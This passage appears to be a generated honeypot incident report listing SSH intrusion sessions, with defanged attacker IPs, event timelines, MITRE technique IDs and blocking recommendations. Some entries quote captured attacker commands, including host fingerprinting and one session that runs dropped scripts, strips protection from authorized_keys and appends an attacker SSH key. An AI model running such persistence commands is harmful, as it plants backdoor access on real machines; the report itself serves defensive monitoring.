**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:05:49` | `cowrie.session.connect` |
| `2026-09-01 21:05:52` | `cowrie.client.version` |
| `2026-09-01 21:05:52` | `cowrie.client.kex` |
| `2026-09-01 21:06:03` | `cowrie.login.success` |
| `2026-09-01 21:06:09` | `cowrie.session.params` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.success` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:09` | `cowrie.command.input` |
| `2026-09-01 21:06:13` | `cowrie.log.closed` |
| `2026-09-01 21:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01071902242

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:07 |
| **Last Seen** | 2026-09-01 21:08 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:07:44` | `cowrie.session.connect` |
| `2026-09-01 21:07:48` | `cowrie.client.version` |
| `2026-09-01 21:07:48` | `cowrie.client.kex` |
| `2026-09-01 21:08:00` | `cowrie.login.success` |
| `2026-09-01 21:08:06` | `cowrie.session.params` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.success` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:06` | `cowrie.command.input` |
| `2026-09-01 21:08:11` | `cowrie.log.closed` |
| `2026-09-01 21:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a6967847e5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-01 21:09 |
| **Last Seen** | 2026-09-01 21:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:09:04` | `cowrie.session.connect` |
| `2026-09-01 21:09:05` | `cowrie.client.version` |
| `2026-09-01 21:09:05` | `cowrie.client.kex` |
| `2026-09-01 21:09:12` | `cowrie.login.success` |
| `2026-09-01 21:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d8b8e1a7fc

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-01 21:09 |
| **Last Seen** | 2026-09-01 21:09 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:09:15` | `cowrie.session.connect` |
| `2026-09-01 21:09:15` | `cowrie.client.version` |
| `2026-09-01 21:09:15` | `cowrie.client.kex` |
| `2026-09-01 21:09:15` | `cowrie.login.success` |
| `2026-09-01 21:09:49` | `cowrie.session.params` |
| `2026-09-01 21:09:49` | `cowrie.command.input` |
| `2026-09-01 21:09:49` | `cowrie.log.closed` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.file_upload` |
| `2026-09-01 21:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def80de9c044

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:09 |
| **Last Seen** | 2026-09-01 21:10 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:09:36` | `cowrie.session.connect` |
| `2026-09-01 21:09:39` | `cowrie.client.version` |
| `2026-09-01 21:09:39` | `cowrie.client.kex` |
| `2026-09-01 21:09:50` | `cowrie.login.success` |
| `2026-09-01 21:09:56` | `cowrie.session.params` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.success` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:09:56` | `cowrie.command.input` |
| `2026-09-01 21:10:00` | `cowrie.log.closed` |
| `2026-09-01 21:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e073c38f3c3a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:09 |
| **Last Seen** | 2026-09-01 21:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:09:46` | `cowrie.session.connect` |
| `2026-09-01 21:09:46` | `cowrie.client.version` |
| `2026-09-01 21:09:47` | `cowrie.client.kex` |
| `2026-09-01 21:09:48` | `cowrie.login.success` |
| `2026-09-01 21:09:48` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:09:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:09:48` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99a834cba2cc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:11 |
| **Last Seen** | 2026-09-01 21:11 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:11:22` | `cowrie.session.connect` |
| `2026-09-01 21:11:25` | `cowrie.client.version` |
| `2026-09-01 21:11:25` | `cowrie.client.kex` |
| `2026-09-01 21:11:37` | `cowrie.login.success` |
| `2026-09-01 21:11:44` | `cowrie.session.params` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.success` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:44` | `cowrie.command.input` |
| `2026-09-01 21:11:48` | `cowrie.log.closed` |
| `2026-09-01 21:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cbf25fe14a6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:13 |
| **Last Seen** | 2026-09-01 21:13 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:13:10` | `cowrie.session.connect` |
| `2026-09-01 21:13:13` | `cowrie.client.version` |
| `2026-09-01 21:13:13` | `cowrie.client.kex` |
| `2026-09-01 21:13:24` | `cowrie.login.success` |
| `2026-09-01 21:13:30` | `cowrie.session.params` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.success` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:30` | `cowrie.command.input` |
| `2026-09-01 21:13:34` | `cowrie.log.closed` |
| `2026-09-01 21:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef40bf41792c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:14 |
| **Last Seen** | 2026-09-01 21:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:14:33` | `cowrie.session.connect` |
| `2026-09-01 21:14:33` | `cowrie.client.version` |
| `2026-09-01 21:14:34` | `cowrie.client.kex` |
| `2026-09-01 21:14:35` | `cowrie.login.success` |
| `2026-09-01 21:14:35` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:14:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:14:35` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a9d24df559

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:14 |
| **Last Seen** | 2026-09-01 21:15 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:14:56` | `cowrie.session.connect` |
| `2026-09-01 21:14:59` | `cowrie.client.version` |
| `2026-09-01 21:14:59` | `cowrie.client.kex` |
| `2026-09-01 21:15:11` | `cowrie.login.success` |
| `2026-09-01 21:15:16` | `cowrie.session.params` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.success` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:16` | `cowrie.command.input` |
| `2026-09-01 21:15:20` | `cowrie.log.closed` |
| `2026-09-01 21:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5061b1f92f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:16 |
| **Last Seen** | 2026-09-01 21:17 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:16:43` | `cowrie.session.connect` |
| `2026-09-01 21:16:45` | `cowrie.client.version` |
| `2026-09-01 21:16:45` | `cowrie.client.kex` |
| `2026-09-01 21:16:57` | `cowrie.login.success` |
| `2026-09-01 21:17:03` | `cowrie.session.params` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.success` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:03` | `cowrie.command.input` |
| `2026-09-01 21:17:07` | `cowrie.log.closed` |
| `2026-09-01 21:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362d8c11b67b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:18 |
| **Last Seen** | 2026-09-01 21:18 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:18:26` | `cowrie.session.connect` |
| `2026-09-01 21:18:29` | `cowrie.client.version` |
| `2026-09-01 21:18:29` | `cowrie.client.kex` |
| `2026-09-01 21:18:39` | `cowrie.login.success` |
| `2026-09-01 21:18:44` | `cowrie.session.params` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.success` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:44` | `cowrie.command.input` |
| `2026-09-01 21:18:45` | `cowrie.command.input` |
| `2026-09-01 21:18:49` | `cowrie.log.closed` |
| `2026-09-01 21:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119e38beb028

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:20 |
| **Last Seen** | 2026-09-01 21:20 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:20:05` | `cowrie.session.connect` |
| `2026-09-01 21:20:08` | `cowrie.client.version` |
| `2026-09-01 21:20:08` | `cowrie.client.kex` |
| `2026-09-01 21:20:17` | `cowrie.login.success` |
| `2026-09-01 21:20:23` | `cowrie.session.params` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.success` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:23` | `cowrie.command.input` |
| `2026-09-01 21:20:27` | `cowrie.log.closed` |
| `2026-09-01 21:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a42442ba5e18

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:20 |
| **Last Seen** | 2026-09-01 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:20:31` | `cowrie.session.connect` |
| `2026-09-01 21:20:31` | `cowrie.client.version` |
| `2026-09-01 21:20:31` | `cowrie.client.kex` |
| `2026-09-01 21:20:32` | `cowrie.login.success` |
| `2026-09-01 21:20:32` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:20:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:20:32` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e3a853bcdb8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:21 |
| **Last Seen** | 2026-09-01 21:22 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:21:42` | `cowrie.session.connect` |
| `2026-09-01 21:21:44` | `cowrie.client.version` |
| `2026-09-01 21:21:44` | `cowrie.client.kex` |
| `2026-09-01 21:21:58` | `cowrie.login.success` |
| `2026-09-01 21:22:05` | `cowrie.session.params` |
